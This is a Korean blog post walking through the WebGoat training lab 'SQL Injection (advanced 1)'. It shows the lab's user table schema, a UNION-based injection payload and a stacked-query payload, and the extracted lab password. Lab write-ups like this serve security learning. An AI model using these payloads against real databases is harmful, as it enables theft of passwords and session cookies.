---
layout: post
title: WebGoat - SQL Injection (advanced 1)
date: 2021-01-10 17:30:00 +0900
category: Web_Hacking
---

# WebGoat - SQL Injection (advanced 1)

#### 다른 테이블에서 데이터 추출하기

<br/>

> SQL Injection 이란 악의적인 SQL 쿼리를 삽입하여 데이터베이스 조회, 삭제, 변조하는 공격이다. 

<br/>

WebGoat 데이터베이스의 여러 테이블 중 하나는 다음과 같다.

```shell
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

<br/>

#### a) UNION 또는 JOIN으로 테이블들 결합하기

이전 문제에 사용했던 'Smith'를 입력해보면 7개의 애트리뷰트를 가진 다른 테이블을 확인할 수 있다.

![webgoat_sqli_adv1](/public/img/webgoat_sqli_adv1.PNG)

<br/>

이 테이블과 user_system_data 테이블을 UNION으로 결합해보자. 이 때, 애트리뷰트의 개수를 맞춰주어야 한다. 

```shell
Smith' union select userid, user_name, password, cookie, null, null, null from user_system_data --
```

![webgoat_sqli2_adv2](/public/img/webgoat_sqli_adv2.PNG)

<br/>

다중 쿼리를 이용해서 문제를 풀 수도 있다.

```shell
'; select * from user_system_data --
```

![webgoat_sqli2_adv2](/public/img/webgoat_sqli_adv2-2.PNG)

<br/>

#### b) Dave의 password 추출하기

위의 결과를 통해 Dave의 password는 passW0rD임을 알 수 있다.

![webgoat_sqli2_adv3](/public/img/webgoat_sqli_adv3.PNG)



